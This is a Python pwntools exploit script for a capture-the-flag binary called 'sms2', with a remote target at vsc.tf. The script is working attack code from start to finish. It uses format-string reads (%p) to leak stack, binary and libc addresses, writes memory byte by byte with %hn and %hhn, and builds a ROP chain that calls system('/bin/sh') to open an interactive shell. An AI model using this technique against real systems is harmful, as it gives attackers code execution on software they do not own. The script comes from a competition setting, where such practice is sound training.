from pwn import *
from icecream import ic

elf = exe = ELF("./sms2")
libc = ELF("./libc-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("vsc.tf", 7002)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001322
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(inp2):
    ru("Message:")
    sl(b'a')
    ru("Your name:")
    sl(f"%{inp2}$p".encode())
    ru("Bushy-tailed farewells,\n")
    a = int(re(14).decode(), 16)
    # ru("Would you like to send another message? (y/n)")
    # sl('y')
    return a

stack_leak = leak('6') - 0xb + 0x90
ic(hex(stack_leak))

def write(inp2, retaddr):
    ic(hex(inp2))
    test = str(hex(inp2)[2:])
    test2 = int(test[-4:-2], 16)
    test3 = int(test[-6:-4], 16)
    test4 = int(test[-8:-6], 16)
    test5 = int(test[-10:-8], 16)
    test6 = int(test[-12:-10], 16)
    test = int(test[-2:], 16)
    l = [test6, test5, test4, test3, test2, test]
    ic(l)
    for i in range(6):
        ru("Message:")
        sl(p64(retaddr+i))
        ru("Your name:")
        payload = f"%{l.pop()}c%12$hn".encode()
        sl(payload)
        ret2main()
        # ru("Would you like to send another message? (y/n)")
        # sl('y')

def ret2main():
    ru("Message:")
    sl(p64(stack_leak))
    ru("Your name:")
    payload = f"%52c%12$hhn".encode()
    sl(payload)


ret2main()
elf.address = leak('9') - 0x13bb
ret2main()
libc.address = leak('19') - 0x80faa
ret2main()

pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8678
system = libc.address + 0x50d70
ret = elf.address + 0x000000000000101a


write(pop_rdi, stack_leak+8)
write(binsh, stack_leak+16)
write(system, stack_leak+24)
# write(ret, stack_leak)
ru("Message:")
sl(p64(stack_leak))
ru("Your name:")
payload = f"%96c%12$hhn".encode()
sl(payload)


# ru("Message:")
# sl(b'a')
# ru("Your name:")
# sl(b'a')
# ru("Would you like to send another message? (y/n)")
# sl('n')


io.interactive()
